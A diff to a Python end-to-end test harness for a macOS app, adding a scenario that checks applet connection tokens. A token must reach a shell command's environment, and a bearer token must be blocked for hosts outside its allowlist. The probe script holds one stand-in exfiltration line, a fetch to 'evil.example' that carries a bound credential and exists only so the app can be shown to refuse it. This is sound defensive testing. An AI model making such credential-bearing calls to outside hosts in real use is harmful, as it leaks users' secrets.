@@ -42,7 +42,14 @@ Invocation:
                                             the app itself when nothing is
                                             connected yet, so it works both
                                             standalone and as part of the
-                                            full run.
+                                            full run. scenario_connections is
+                                            similarly self-contained, but
+                                            ALWAYS (re)launches its own app
+                                            process (quitting one already up)
+                                            since it needs
+                                            $DREAMUX_CONNECTIONS_SECRET_DIR
+                                            set before the process's first
+                                            touch of ConnectionStore.shared.
 
 Exit status: 0 only when every requested scenario passed.
 """
@@ -81,6 +88,10 @@ STATE_DIR = os.path.join(SANDBOX, "state")
 # fixtures would land there.
 APPS_ROOT = os.path.join(SANDBOX, "apps-root")
 PROJECT_DIR = os.path.join(PROJECTS_ROOT, PROJECT_NAME)
+# File-backed connection secret store for scenario_connections (see
+# SecretStoreFactory.makeDefault()) -- sandboxed so a connection's token
+# never touches the real macOS Keychain.
+CONNECTIONS_SECRET_DIR = os.path.join(SANDBOX, "connections-secrets")
 
 GIT_IDENTITY = [
     "-c", "user.name=Dreamux E2E",
@@ -1637,6 +1648,205 @@ def scenario_applets(d):
                  "lib-probe folder + appdata to be gone from disk after removeApplet")
 
 
+def connections_probe_html():
+    """The probe applet's index.html: three independent try/catch blocks,
+    each writing its own kv key, so one slot's failure (pre-bind, both
+    slots are unbound) never blocks the others from running. Re-used
+    verbatim for the pre-bind AND post-bind loads -- rewriting it with
+    identical bytes still bumps the folder's mtime, which is all the
+    applet's 1s hot-reload poller needs to reload and re-run it."""
+    return (
+        '<!doctype html><html><head><meta charset="utf-8">'
+        '<title>Connections Probe</title></head>\n'
+        '<body><div id="out">waiting</div>\n'
+        '<script src="./dreamux.js"></script>\n'
+        '<script type="module">\n'
+        "try {\n"
+        "  const status = await window.dreamux.connections.status('shellSlot');\n"
+        "  await window.dreamux.kv.set('statusBound', status.bound);\n"
+        "} catch (e) {\n"
+        "  await window.dreamux.kv.set('statusBound', 'error:' + e.message);\n"
+        "}\n"
+        "try {\n"
+        "  const r = await window.dreamux.shell.exec('printf %s \"$PROBE_TOKEN\"', "
+        "{ connection: 'shellSlot' });\n"
+        "  await window.dreamux.kv.set('shellToken', r.stdout);\n"
+        "} catch (e) {\n"
+        "  await window.dreamux.kv.set('shellToken', 'error:' + e.message);\n"
+        "}\n"
+        "try {\n"
+        "  await window.dreamux.http.fetch('https://evil.example/x', { connection: 'httpSlot' });\n"
+        "  await window.dreamux.kv.set('httpGate', 'LEAKED');\n"
+        "} catch (e) {\n"
+        "  await window.dreamux.kv.set('httpGate', 'blocked');\n"
+        "}\n"
+        '</script></body></html>\n'
+    )
+
+
+def scenario_connections(d):
+    """Applet Connections (Task 9): the security-critical slot -> binding ->
+    connection -> token composition, driven through the REAL native bridge
+    (AppletBridge/AppletConnectionResolver/ConnectionAuthenticator/
+    AppletShell -- no parallel test implementation) and asserted on disk,
+    never pixels (WKWebView is blank in-process, same as scenario_applets).
+
+    TLS-free by design, not by accident: AppletBridge's http.fetch runs
+    through plain `URLSession.shared` with no delegate, so a self-signed
+    localhost cert would be rejected at the TLS layer before any echo, and
+    the authenticator correctly refuses to attach a token over plain http.
+    Rather than add test-only TLS-trust code to the app just to reach a
+    live 200, this proves the same security-critical composition WITHOUT
+    a network round-trip at all:
+
+      1. Shell env-injection POSITIVE: an `env`-kind connection's token
+         really reaches a `shell.exec` call's process env --
+         slot -> binding -> connection -> ConnectionAuthenticator.env ->
+         AppletShell.exec -- asserted via the shell echoing its own
+         injected env var back into kv.json (`shellToken == "tok-123"`).
+      2. HTTP host-allowlist NEGATIVE: a `bearer`-kind connection's token
+         is refused for a host outside its own allowlist --
+         ConnectionAuthenticator rejects BEFORE `URLSession` is ever
+         called, so nothing is sent and no token leaves the process
+         (`httpGate == "blocked"`). No server needs to be listening for
+         this to be a meaningful assertion -- the whole point is that
+         nothing is dispatched.
+      3. `connections.status(slot).bound` flips false -> true across
+         `bindConnection`, proving the binding itself took effect.
+
+    Always (re)launches its OWN app process with
+    $DREAMUX_CONNECTIONS_SECRET_DIR set: `ConnectionStore.shared` is a
+    lazy singleton that picks file-backed vs Keychain storage on its FIRST
+    touch anywhere in the process -- as early as the first AppletSession's
+    init -- so this can't safely piggyback on a process an earlier
+    scenario (e.g. scenario_applets) already started without that env var,
+    which would silently fall through to the real macOS Keychain.
+    """
+    if d.sock is not None:
+        resp = d.cmd("quit")
+        require(resp.get("ok") is True, "quit before connections relaunch failed")
+        d.wait_for_exit()
+    d.launch_app(extra_env={"DREAMUX_CONNECTIONS_SECRET_DIR": CONNECTIONS_SECRET_DIR})
+
+    def project_window_up():
+        state = d.state()
+        active = state.get("activeProject")
+        return active and active.get("name") == PROJECT_NAME
+    d.wait_until(project_window_up, 30.0, f"project window for {PROJECT_NAME}")
+    d.cmd("setSidebarMode", mode="workspace")
+
+    # 1/2. Two connections: an env-kind one (shell env-injection) and a
+    # bearer-kind one scoped to a host the probe never calls (allowlist
+    # negative -- evil.example is never in hosts).
+    resp = d.cmd("createConnection", id="env-conn", kind="env",
+                 envVar="PROBE_TOKEN", token="tok-123", hosts=[])
+    require(resp["id"] == "env-conn", f"unexpected env connection id: {resp!r}")
+
+    resp = d.cmd("createConnection", id="bearer-conn", kind="bearer",
+                 token="gh-tok-456", hosts=["api.github.com"])
+    require(resp["id"] == "bearer-conn", f"unexpected bearer connection id: {resp!r}")
+
+    # Tokens landed in the FILE-backed secret store (one 0600 file per
+    # connection id), never the real Keychain.
+    secret_files = (
+        set(os.listdir(CONNECTIONS_SECRET_DIR))
+        if os.path.isdir(CONNECTIONS_SECRET_DIR) else set()
+    )
+    require({"env-conn", "bearer-conn"} <= secret_files,
+            f"connection tokens should land in {CONNECTIONS_SECRET_DIR}, found: {secret_files}")
+
+    state = d.cmd("connectionsState")
+    hosts_by_id = {c["id"]: c["hosts"] for c in state["connections"]}
+    require(hosts_by_id.get("bearer-conn") == ["api.github.com"],
+            f"bearer-conn hosts wrong: {hosts_by_id}")
+
+    # 3. Scaffold the probe applet, then declare the two slots + the three
+    # capabilities its script calls (kv always, plus http/shell for the
+    # connection-gated calls).
+    resp = d.cmd("createApplet", name="Connections Probe", description="e2e connections probe")
+    slug = resp["slug"]
+    probe_dir = applet_dir(slug)
+
+    write_text(os.path.join(probe_dir, "index.html"), connections_probe_html())
+    manifest_path = os.path.join(probe_dir, "manifest.json")
+    manifest = read_json(manifest_path)
+    manifest["requiresCapabilities"] = ["kv", "http", "shell"]
+    manifest["requiresConnections"] = [
+        {"id": "shellSlot", "label": "Shell Env Probe", "hosts": []},
+        {"id": "httpSlot", "label": "HTTP API Probe", "hosts": ["api.github.com"]},
+    ]
+    write_json(manifest_path, manifest)
+
+    # 4. Open BEFORE binding: connections.status must read bound:false, and
+    # the (still-unbound) shell/http calls must fail closed -- nothing sent.
+    d.cmd("openApplet", slug=slug)
+    kv_path = applet_kv_path(slug)
+
+    def status_reads(expected):
+        def probe():
+            try:
+                kv = read_json(kv_path)
+            except (OSError, json.JSONDecodeError):
+                return None
+            return kv if kv.get("statusBound") is expected else None
+        return probe
+
+    d.wait_until(status_reads(False), 15.0,
+                 "kv.json statusBound to read false before binding (bridge round-trip pre-bind)")
+
+    # 5. Bind both slots -- AppletSession.bind (T8's seam, the same write
+    # the host view's bind sheet performs) against the applet's live
+    # ConnectionBindingStore.
+    d.cmd("bindConnection", slug=slug, slot="shellSlot", connectionID="env-conn")
+    d.cmd("bindConnection", slug=slug, slot="httpSlot", connectionID="bearer-conn")
+
+    bindings_path = os.path.join(applet_appdata_dir(slug), "connections.json")
+
+    def bindings_written():
+        try:
+            return read_json(bindings_path)
+        except (OSError, json.JSONDecodeError):
+            return None
+    bindings = d.wait_until(bindings_written, 5.0, "connections.json binding file to appear on disk")
+    require(bindings == {"shellSlot": "env-conn", "httpSlot": "bearer-conn"},
+            f"unexpected bindings on disk: {bindings}")
+
+    # 6. Force the SAME probe script to re-run now that both slots are
+    # bound: rewriting index.html (even with identical bytes) bumps the
+    # folder's mtime, which the applet's 1s hot-reload poller picks up and
+    # reloads on -- same mechanism scenario_applets' negative-gate check
+    # uses to re-trigger a script after a manifest/file edit.
+    write_text(os.path.join(probe_dir, "index.html"), connections_probe_html())
+    d.cmd("openApplet", slug=slug)
+
+    def bridge_round_trip_complete():
+        try:
+            kv = read_json(kv_path)
+        except (OSError, json.JSONDecodeError):
+            return None
+        if (kv.get("shellToken") == "tok-123"
+                and kv.get("httpGate") == "blocked"
+                and kv.get("statusBound") is True):
+            return kv
+        return None
+
+    kv = d.wait_until(
+        bridge_round_trip_complete, 15.0,
+        "kv.json to gain shellToken=tok-123 + httpGate=blocked + statusBound=true after "
+        "binding (shell env-injection and http allowlist-block through the real bridge)")
+    require(kv["shellToken"] == "tok-123",
+            f"shell.exec should have received PROBE_TOKEN via the bound env connection: {kv}")
+    require(kv["httpGate"] == "blocked",
+            f"http.fetch to a non-allowlisted host must be rejected with nothing sent: {kv}")
+    require(kv["statusBound"] is True,
+            f"connections.status should read bound:true once bound: {kv}")
+
+    # The whole point of the disk assertions above: WKWebView content is
+    # GPU-composited and comes out blank here (see PROTOCOL.md) -- this
+    # screenshot documents the chrome, not proof of the bridge round-trip.
+    d.screenshot("connections-probe")
+
+
 def scenario_quit(d):
     """The app quits cleanly on command."""
     resp = d.cmd("quit")
@@ -1656,6 +1866,7 @@ SCENARIOS = [
     ("plan-gate", scenario_plan_gate),
     ("overview", scenario_overview),
     ("applets", scenario_applets),
+    ("connections", scenario_connections),
     ("quit", scenario_quit),
 ]
 
